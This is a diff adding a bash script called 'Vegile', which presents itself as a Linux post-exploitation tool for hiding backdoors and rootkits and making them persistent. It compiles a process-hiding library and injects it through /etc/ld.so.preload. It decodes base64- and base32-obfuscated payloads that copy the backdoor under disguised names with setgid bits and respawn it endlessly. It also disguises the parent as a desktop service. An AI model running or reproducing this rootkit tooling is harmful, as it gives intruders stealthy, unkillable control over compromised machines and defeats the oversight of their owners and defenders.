@@ -1,0 +1,302 @@
+#!/bin/bash
+
+name="Vegile"
+
+#WARNA KESUKAAN
+
+cyan='\e[0;36m'
+green='\e[0;34m'
+okegreen='\033[92m'
+lightgreen='\e[1;32m'
+white='\e[1;37m'
+red='\e[1;31m'
+yellow='\e[0;33m'
+BlueF='\e[1;34m' #Biru
+RESET="\033[00m" #normal
+orange='\e[38;5;166m'
+
+function banner() {
+clear
+echo -e "$okegreen"
+echo "  _____         _ _   "
+echo " |  |  |___ ___|_| |___ "
+echo " |  |  | -_| . | | | -_| "
+echo "  \___/|___|_  |_|_|___| v1.0"
+echo "           |___| "
+echo -e " $RESET"
+echo -e $okegreen"   $name "$RESET"is a tool for "$okegreen"post exploitation"$RESET" in linux, "
+echo -e $RESET"   it will be hidden,unstopable and transparent your process like a "$okegreen"Ghost in The Shell,"
+echo
+}
+
+function help_vegile(){
+banner
+echo " | "
+echo " | "
+echo " |_ "
+echo "    Options: $name [options] backdoor/rootkits "
+echo ""
+echo -e $okegreen"	     --i / --inject    "$RESET"||  this option will be "$okegreen"hidden your spesific process "$RESET"( Ghost )"
+echo ""
+echo -e $okegreen"	     --u / --unlimited "$RESET"||  Unlimited your backdoor/rootkit  and sessions  in metasploit handler"
+echo -e "				   "$okegreen"Even when it killed, it will re-run again."
+echo -e ""
+echo -e $okegreen"	     --h / --help      "$RESET"||  Extended help information"
+echo ""
+echo ""
+}
+function info () {
+echo -e $okegreen""
+echo "  _____         _ _ "
+echo " |  |  |___ ___|_| |___ "
+echo " |  |  | -_| . | | | -_| "
+echo "  \___/|___|_  |_|_|___| v1.0"
+echo "           |___| "
+echo -e $okegreen  " _ $RESET"
+echo -e $okegreen" |"$RESET"  Usage: "$okegreen"$name "$RESET"--h "
+echo -e $okegreen" |"$RESET"         "$okegreen"$name "$RESET"--u [name_door] example : "$okegreen"vnm --u backdoor $RESET "
+echo -e $okegreen" |"$RESET"	   "$okegreen"$name "$RESET"--i [name_door] example : "$okegreen"vnm --i rootkit  $RESET"
+echo -e $okegreen" |"$RESET" "
+echo -e $okegreen" |"$RESET"  $name is a tool for "$okegreen"post exploitation in linux, "
+echo -e $okegreen" |"$RESET"  this tool will setting up your backdoor/rootkits "
+echo -e $okegreen" |"$RESET"  when "$okegreen"backdoor "$RESET"already setup it will be "$okegreen"hidden,unlimited and transparent."
+echo -e $okegreen" |"$RESET"  Even when "$okegreen "it killed,it will re-run again"
+echo -e $okegreen" |"$RESET"  There "$okegreen"always "$RESET"be a procces which while "$okegreen"run another process,"
+echo -e $okegreen" |_ "$RESET"So we "$okegreen"can assume "$RESET"that this procces is "$okegreen"unstopable "$RESET"like a "$okegreen"Ghost in The Shell"
+echo
+echo
+}
+
+
+
+function inject_hidden_pon(){
+pwd=`pwd`
+conf="tmp/conf.txt"
+echo " | "
+echo " | "
+echo " |_ "
+echo -e $okegreen"    +$RESET Clean old config in temporary folder "
+rm $conf >> /dev/null 2&>1 ; rm tmp/* >> /dev/null 2&>1
+echo
+sleep 2
+echo -e $okegreen"    +$RESET Create a file config "
+touch $conf
+echo
+sleep 2
+echo $babe > $conf
+s0=$(cat $conf | cut -d ' ' -f1)
+echo -e $okegreen"    +$RESET Settings libprocess for spesific rootkit/backdoor"
+sleep 2
+echo
+sed s#HIDEN_INJECT_POINT#$babe#g $pwd/lib/processhider.c > $pwd/tmp/libprocesshider.c
+echo -e $okegreen"    +$RESET Setup and Compile libprocess  "
+sleep 2
+echo
+gcc -Wall -fPIC -shared -o tmp/libprocesshider.so lib/processhider.c -ldl
+echo -e $okegreen"    +$RESET Move libprocess to local libraries  "
+sleep 2
+echo
+mv tmp/libprocesshider.so /usr/local/lib/
+echo -e $okegreen"    +$RESET Load libprocess for get hidden process  "
+setsid sh -c "./$babe" & > /dev/tty2 >&0 2>&1
+sleep 2
+echo ""
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+sleep 1
+echo -ne $okegreen"    +$RESET Inject Point for hidden Procces Complete \n\n\n"
+
+}
+
+
+
+function inject_point_enc_0() {
+cat << !
+WHVYbkFLPWBlY2hvIEtRWURLVTJYSVZMR0NWQ0ZMSklGSzNEUUxCSlRDM0MyS04zVzZQSUsgfCBi
+YXNlMzIgLWQgYDtta0l1eFhYc0I9YGVjaG8gVlcxd1ZtVldaRVpaZWtKV1lrVktUMVV5ZUZkWFJU
+VkdaVVp3VkdReU9EbERaejA5Q2c9PSB8IGJhc2U2NCAtZCBgO01qaW5YTkE9YGVjaG8gJG1rSXV4
+WFhzQiB8IGJhc2U2NCAtZGA7TXVYYTA9YGVjaG8gJFh1WG5BSyB8IGJhc2U2NCAtZGA7TGVYbUxr
+SUlueEE9YGVjaG8gJE1qaW5YTkEgfCBiYXNlNjQgLWRgO01rQVNubk9OQUlTTm5PSXhueG5uTkFT
+TkFOU29pbm54PWBlY2hvICRMZVhtTGtJSW54QXwgYmFzZTMyIC1kIGA7S1FZREtWYUZjWD1gZWNo
+byAkTXVYYTAgfCBiYXNlMzIgLWRgO011WG9BZmE9YGVjaG8gU2pWR1JrOVdNa1JKVGtsVU1rTlJQ
+UW89IHwgYmFzZTY0IC1kYDtNQ0FPVnh6QT1gZWNobyAkTXVYb0FmYSB8IGJhc2UzMiAtZGA7TWtz
+WHVCWmFhZj1gZWNobyAkTUNBT1Z4ekEgfCBiYXNlMzIgLWRgO0p4SmEwQUFDPWBlY2hvIEtSQ1hB
+UktXTk1ZSFNWQ0ZLWkdFNFZTS0taTERBVFNTS0JJVzZQSUsgfCBiYXNlMzIgLWRgO01veEFlakNB
+QT1gZWNobyAkSnhKYTBBQUMgfCBiYXNlNjQgLWRgO0hSaU14VT1gZWNobyAkTW94QWVqQ0FBIHxi
+YXNlMzIgLWRgO0tvTnRMb289YGVjaG8gJEhSaU14VSB8IGJhc2U2NCAtZGA7bU94eEEwb1A9YGVj
+aG8gSlZKRUtSS1ZHSkJWVVIyS0dKRFZTV0pUSkJIRElOU1JLVTZUMlBJSyB8IGJhc2UzMiAtZGA7
+Q2hYaXpTQWNjPWBlY2hvICRtT3h4QTBvUCB8IGJhc2UzMiAtZGA7TU1tTlViej1gZWNobyAgJENo
+WGl6U0FjYyB8IGJhc2U2NCAtZGA7cFhvQXVuPWBlY2hvIExGNUU0VjNFR0ZZRlNVM0tKSlVGT1JK
+Vk81TkVLWkNYTUVZRTQzU1FLUVlFV0NRPSB8IGJhc2UzMiAtZCBgO0p4VUhOYU1NPWBlY2hvICRw
+WG9BdW4gfCBiYXNlNjQgLWQgYDtQa0tLYVhYWno9YGVjaG8gJEp4VUhOYU1NIHwgYmFzZTY0IC1k
+YAptSXhBQWhOb1FXV3VJPWBlY2hvIFZFVldXbEl3YXpCTk1FcElVMnRXV1ZVeFdYbFdhemxQVW14
+R1ZsQlVNRGxEWnowOUNnPT0gfCBiYXNlNjQgLWQgYCA7SmltQU5OQU5EeFg9YGVjaG8gJG1JeEFB
+aE5vUVdXdUkgfCBiYXNlNjQgLWQgYApIck1uaVViPWBlY2hvICRKaW1BTk5BTkR4WCB8IGJhc2Uz
+MiAtZGA7QW51R3JBaHhBbm5uYTJObT1gZWNobyAkSHJNbmlVYiB8IGJhc2U2NCAtZCBgO01tb2th
+c0RPU0lVSERuam5vbmppTkFTSVVKREJBU2Rhc2tsej1gZWNobyAkQW51R3JBaHhBbm5uYTJObSB8
+IGJhc2U2NCAtZCBgO3JoTUl4YT1gZWNobyBURE5XZW1OcE9YTmhWMGwyV1ZoUmRHTXpRbkJOYVRG
+cVlqTktiRXd5UmpCTVdFNTNZVlJKZEZreU9YbGFVekZ6V1ZoV2RWa3lhR3hqWjI4OUNnPT0gfCBi
+YXNlNjQgLWQgYDtKdW1BUG1OTklBVUJuWD1gZWNobyAkcmhNSXhhIHwgYmFzZTY0IC1kIGAKCgo=
+
+
+!
+}
+
+function crt_inject_point_2 () {
+for MmnMMnnUUUHbVzXaF in {$KQYDKVaFcX,$KoNtLoo,$MMmNUbz,$PkKKaXXZz,$MksXuBZaaf}
+do
+cp $babe $MkASnnONAISNnOIxnxnnNASNANSoinnx$MmnMMnnUUUHbVzXaF
+#sleep 1
+setsid sh -c "$MkASnnONAISNnOIxnxnnNASNANSoinnx$MmnMMnnUUUHbVzXaF" & > /dev/tty2 >&0 2>&1
+done
+}
+
+
+function payload_inject_unlimited(){
+cat << !
+IyEvYmluL2Jhc2gKCgoKZnVuY3Rpb24gb2JmdXNfdmFyKCkgewpsY2Rhc3Q9Ii91c3IvYmluIgpt
+a0l1eFhYc0I9YGVjaG8gVlcxd1ZtVldaRVpaZWtKV1lrVktUMVV5ZUZkWFJUVkdaVVp3VkdReU9E
+bERaejA5Q2c9PSB8IGJhc2U2NCAtZCBgO01qaW5YTkE9YGVjaG8gJG1rSXV4WFhzQiB8IGJhc2U2
+NCAtZGAKTGVYbUxrSUlueEE9YGVjaG8gJE1qaW5YTkEgfCBiYXNlNjQgLWRgO01rQVNubk9OQUlT
+Tm5PSXhueG5uTkFTTkFOU29pbm54PWBlY2hvICRMZVhtTGtJSW54QXwgYmFzZTMyIC1kIGAKWHVY
+bkFLPWBlY2hvIEtRWURLVTJYSVZMR0NWQ0ZMSklGSzNEUUxCSlRDM0MyS04zVzZQSUsgfCBiYXNl
+MzIgLWQgYDtZdVhWMUE9YGVjaG8gUmpVeVdFYzBVbEJPVWxWWFJVd3pUVTVHVWtoSE5ETk5UbEZH
+UVQwOVBUMEsgfCBiYXNlNjQgLWRgO2prVEVtNDg9YGVjaG8gJFl1WFYxQSB8IGJhc2UzMiAtZGA7
+bUV6eEFBPWBlY2hvIFRETldlbU5wT1hOaFYwbDJZa2RzYVZsdGVHaGpkMjg5Q2c9PSB8IGJhc2U2
+NCAtZGA7YWRBbVpsSEg9YGVjaG8gJG1FenhBQSB8IGJhc2U2NCAtZGA7RGlJbUFBeHpBbW1OTk5B
+U2N1dVVBS0hBS0hBS0hiYkE9YGVjaG8gVGxKVlYwVlpWRTFOUmxwVE5EUXpVRVpaV1ZGVlBUMDlD
+Zz09IHwgYmFzZTY0IC1kIGA7TW5BeGFhYUU9YGVjaG8gWWtkc2FXTXpUbk5OVXpSM1RHcEJTd289
+IHwgYmFzZTY0IC1kYDtGbFhzaEE9YGVjaG8gJE1uQXhhYWFFIHwgYmFzZTY0IC1kIGA7TW5QZVAz
+S3g9YGVjaG8gJERpSW1BQXh6QW1tTk5OQVNjdXVVQUtIQUtIQUtIYmJBIHwgYmFzZTMyIC1kYDtN
+dVhhMD1gZWNobyAkWHVYbkFLIHwgYmFzZTY0IC1kYDtLUVlES1ZhRmNYPWBlY2hvICRNdVhhMCB8
+IGJhc2UzMiAtZGA7TXVYb0FmYT1gZWNobyBTalZHUms5V01rUkpUa2xVTWtOUlBRbz0gfCBiYXNl
+NjQgLWRgO01DQU9WeHpBPWBlY2hvICRNdVhvQWZhIHwgYmFzZTMyIC1kYDtNa3NYdUJaYWFmPWBl
+Y2hvICRNQ0FPVnh6QSB8IGJhc2UzMiAtZGA7SnhKYTBBQUM9YGVjaG8gS1JDWEFSS1dOTVlIU1ZD
+RktaR0U0VlNLS1pMREFUU1NLQklXNlBJSyB8IGJhc2UzMiAtZGA7TW94QWVqQ0FBPWBlY2hvICRK
+eEphMEFBQyB8IGJhc2U2NCAtZGA7SFJpTXhVPWBlY2hvICRNb3hBZWpDQUEgfGJhc2UzMiAtZGA7
+S29OdExvbz1gZWNobyAkSFJpTXhVIHwgYmFzZTY0IC1kYDttT3h4QTBvUD1gZWNobyBKVkpFS1JL
+VkdKQlZVUjJLR0pEVlNXSlRKQkhESU5TUktVNlQyUElLIHwgYmFzZTMyIC1kYDtDaFhpelNBY2M9
+YGVjaG8gJG1PeHhBMG9QIHwgYmFzZTMyIC1kYDtNTW1OVWJ6PWBlY2hvICAkQ2hYaXpTQWNjIHwg
+YmFzZTY0IC1kYDtwWG9BdW49YGVjaG8gTEY1RTRWM0VHRllGU1UzS0pKVUZPUkpWTzVORUtaQ1hN
+RVlFNDNTUUtRWUVXQ1E9IHwgYmFzZTMyIC1kIGA7SnhVSE5hTU09YGVjaG8gJHBYb0F1biB8IGJh
+c2U2NCAtZCBgO1BrS0thWFhaej1gZWNobyAkSnhVSE5hTU0gfCBiYXNlNjQgLWRgCm1JeEFBaE5v
+UVdXdUk9YGVjaG8gVkVWV1dsSXdhekJOTUVwSVUydFdXVlV4V1hsV2F6bFBVbXhHVmxCVU1EbERa
+ejA5Q2c9PSB8IGJhc2U2NCAtZCBgIDtKaW1BTk5BTkR4WD1gZWNobyAkbUl4QUFoTm9RV1d1SSB8
+IGJhc2U2NCAtZCBgO0hyTW5pVWI9YGVjaG8gJEppbUFOTkFORHhYIHwgYmFzZTMyIC1kYDtBbnVH
+ckFoeEFubm5hMk5tPWBlY2hvICRIck1uaVViIHwgYmFzZTY0IC1kIGA7TW1va2FzRE9TSVVIRG5q
+bm9uamlOQVNJVUpEQkFTZGFza2x6PWBlY2hvICRBbnVHckFoeEFubm5hMk5tIHwgYmFzZTY0IC1k
+IGAKfQoKZnVuY3Rpb24gc2VsZl9jb3B5ICgpewpta2RpciAtcCAkamtURW00ODtta2RpciAtcCAk
+YWRBbVpsSEg7Y3AgJDAgJGprVEVtNDgvJEZsWHNoQTtjcCAkMCAkYWRBbVpsSEgvJE1uUGVQM0t4
+O2NobW9kIDI3NTUgJGprVEVtNDgvJEZsWHNoQTtjaG1vZCAyNzc1ICRhZEFtWmxISC8kTW5QZVAz
+S3gKfQoKZnVuY3Rpb24gZG9vcjFfY2hlY2sgKCkgewpQSURTPWAkTW1va2FzRE9TSVVIRG5qbm9u
+amlOQVNJVUpEQkFTZGFza2x6ICRLUVlES1ZhRmNYYAppZiBbIC16ICIkUElEUyIgXTsgdGhlbgog
+ICAgICAgIHNldHNpZCBzaCAtYyAiJEtRWURLVmFGY1giICYgPiAvZGV2L3R0eTIgPiYwIDI+JjEK
+ZWxzZQogICBmb3IgUElEIGluICRQSURTOyBkbwogICAgZWNobyAiIgogIGRvbmUKZmkKfQoKCmZ1
+bmN0aW9uIGRvb3IyX2NoZWNrICgpIHsKUElEUz1gJE1tb2thc0RPU0lVSERuam5vbmppTkFTSVVK
+REJBU2Rhc2tseiAkS29OdExvb2AKaWYgWyAteiAiJFBJRFMiIF07IHRoZW4KICAgICAgICBzZXRz
+aWQgc2ggLWMgIiRLb050TG9vIiAmID4gL2Rldi90dHkyID4mMCAyPiYxCmVsc2UKICAgZm9yIFBJ
+RCBpbiAkUElEUzsgZG8KICAgZWNobyAiIgogIGRvbmUKZmkKfQoKCmZ1bmN0aW9uIGRvb3IzX2No
+ZWNrICgpIHsKUElEUz1gJE1tb2thc0RPU0lVSERuam5vbmppTkFTSVVKREJBU2Rhc2tseiAkUGtL
+S2FYWFp6YAppZiBbIC16ICIkUElEUyIgXTsgdGhlbgogICAgICAgIHNldHNpZCBzaCAtYyAiJFBr
+S0thWFhaeiIgJiA+IC9kZXYvdHR5MiA+JjAgMj4mMQplbHNlCiAgIGZvciBQSUQgaW4gJFBJRFM7
+IGRvCiAgIGVjaG8gIiIKICBkb25lCmZpCn0KCgpmdW5jdGlvbiBkb29yNF9jaGVjayAoKSB7ClBJ
+RFM9YCRNbW9rYXNET1NJVUhEbmpub25qaU5BU0lVSkRCQVNkYXNrbHogJE1rc1h1QlphYWZgCmlm
+IFsgLXogIiRQSURTIiBdOyB0aGVuCiAgICAgICAgc2V0c2lkIHNoIC1jICIkTWtzWHVCWmFhZiIg
+JiA+IC9kZXYvdHR5MiA+JjAgMj4mMQplbHNlCiAgIGZvciBQSUQgaW4gJFBJRFM7IGRvCiAgIGVj
+aG8gIiIKICBkb25lCmZpCn0KCgpmdW5jdGlvbiBkb29yNV9jaGVjayAoKSB7ClBJRFM9YCRNbW9r
+YXNET1NJVUhEbmpub25qaU5BU0lVSkRCQVNkYXNrbHogJE1NbU5VYnpgCmlmIFsgLXogIiRQSURT
+IiBdOyB0aGVuCiAgICAgICBzZXRzaWQgc2ggLWMgIiRNTW1OVWJ6IiAmID4gL2Rldi90dHkyID4m
+MCAyPiYxCmVsc2UKICAgZm9yIFBJRCBpbiAkUElEUzsgZG8KICAgZWNobyAiIgogIGRvbmUKZmkK
+fQoKZnVuY3Rpb24gaW5qZWN0X3BvaW50X3RvX2NoZWNrICgpIHsKd2hpbGUgdHJ1ZQpkbwoJb2Jm
+dXNfdmFyO2Rvb3IxX2NoZWNrO3NsZWVwIDI7ZG9vcjJfY2hlY2s7c2xlZXAgMSA7ZG9vcjNfY2hl
+Y2s7c2xlZXAgMTtkb29yNF9jaGVjaztzbGVlcCAzO2Rvb3I1X2NoZWNrO3NsZWVwIDEKZG9uZQp9
+CgoKaW5qZWN0X3BvaW50X3RvX2NoZWNrCg==
+
+!
+}
+
+
+
+#check_loop
+case $1 in
+	--u|--unlimited)
+  	babe=$2
+	if [ -f "$babe" ]
+	  then
+clear;resize -s 32 95 > /dev/null
+conf="tmp/conf.txt";pwd=`pwd`
+banner;echo -ne " Create Inject Point [ Unlimited ]   \n\n"
+echo " | "
+echo " | "
+echo " |_ "
+echo -e $okegreen "    +"$RESET" Clean  old config in temporary folder "
+sleep 1;echo
+rm tmp/TmpFuncHollyShit > /dev/null 2&>1;rm $conf >> /dev/null 2&>1;rm tmp/*.c >> /dev/null 2&>1
+inject_point_enc_0 | base64 -d > tmp/TmpFuncHollyShit
+source tmp/TmpFuncHollyShit
+echo -e $okegreen "    +"$RESET" Execute Child Process with infinity sessions ( unstopable ) "
+sleep 1;echo
+crt_inject_point_2 ;touch $conf
+echo -e $okegreen "    +"$RESET" Create & Make The Parent Process  Invisible "
+sleep 1;echo
+mCoreHidDeNAKSDA="at-spi2-core-launcher"
+s0=$(cat $conf | cut -d ' ' -f1)
+echo -e $okegreen "    +"$RESET" Settings libprocess for spesific rootkit/backdoor"
+sleep 1;echo
+sed s#HIDEN_INJECT_POINT#$mCoreHidDeNAKSDA#g $pwd/lib/processhider.c > $pwd/tmp/libprocesshider.c
+echo -e $okegreen "    +"$RESET" Setup and Compile libprocess  "
+sleep 1;echo
+gcc -Wall -fPIC -shared -o $pwd/tmp/libprocesshider.so $pwd/lib/processhider.c -ldl
+echo -e $okegreen "    +"$RESET" Move libprocess to local libraries  "
+sleep 1;echo
+mv tmp/libprocesshider.so /usr/local/lib/
+echo -e $okegreen "    +"$RESET" Load libprocess for get hidden process  "
+sleep 1;echo
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+echo -e $okegreen "    +"$RESET" Execute The Parent Process  "
+sleep 1;echo
+payload_inject_unlimited | base64 -d > $JumAPmNNIAUBnX
+chmod 2755 $JumAPmNNIAUBnX
+setsid sh -c "$JumAPmNNIAUBnX" & > /dev/tty2 >&0 2>&1
+	echo -ne $okegreen " Create Inject Point Succes , "$RESET"Press any key to exit \n\n"
+	read anjenglo
+	rm tmp/* >> /dev/null 2&>1
+  	exit 1
+ 	 elif [ ! -f "$babe"  ]
+			then
+		banner;echo " | "
+		echo -e " | "
+		echo -e " |_ "
+		echo -e "    + $RESET File not Found\n\n"
+fi
+;;
+
+--i|--inject)
+babe=$2
+	if [ -f "$babe" ]
+	  then
+
+  	resize -s 35 98 > /dev/null;banner;echo -ne " Create Inject Point for create hidden rocess \n\n"
+	inject_hidden_pon
+	echo -ne $okegreen " Create Inject Point Succes , "$RESET"Press any key to exit \n\n"
+	rm tmp/* >> /dev/null 2&>1
+	read anjenglo
+  exit 1
+  elif [ ! -f "$babe"  ]
+	 then
+	banner;echo " | "
+	echo -e " | "
+	echo -e " |_ "
+	echo -e "    + $RESET File not Found\n\n"
+fi
+;;
+
+--h|--help)
+	resize -s 26 107 > /dev/null;help_vegile
+;;
+
+*)
+	echo
+	clear
+	info
+;;
+esac
